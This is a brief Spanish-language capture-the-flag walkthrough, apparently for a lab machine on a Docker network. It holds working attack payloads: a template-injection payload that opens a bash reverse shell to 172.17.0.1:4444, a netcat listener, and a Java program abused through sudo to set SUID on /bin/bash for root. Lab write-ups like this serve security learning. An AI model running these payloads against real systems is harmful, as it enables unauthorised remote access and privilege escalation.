## Reconocimiento:

Puerto 5000 : upnp

En la web hay un formulario de registro. Intento fuzzing y no encuentro nada útil. Decido probar con algún XSS a ver si es posible:

```bash
<script>alert('XSS')</script>
```

Funciona, ahora toca mandarnos una rev shell.

Me pongo en escucha:

```bash
nc -lnvp 4444
```

La mando:

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"').read() }}
```

## Escalada

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/java
```

Voy a crear un script que le de permisos SUID al binario bash:

```bash
import java.io.IOException;

public class SetSUID {
    public static void main(String[] args) {
        try {
            // Comando para dar permisos SUID a la /bin/bash
            String cmd = "chmod u+s /bin/bash";
            
            // Ejecutar el comando en la terminal
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
            
            // Esperar a que termine
            process.waitFor();
            
            System.out.println("Intento de establecer SUID en /bin/bash completado.");
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
```

Lo ejecuto:

```bash
sudo /usr/bin/java SUID.java 
```

```bash
bash -p
```

Listo.
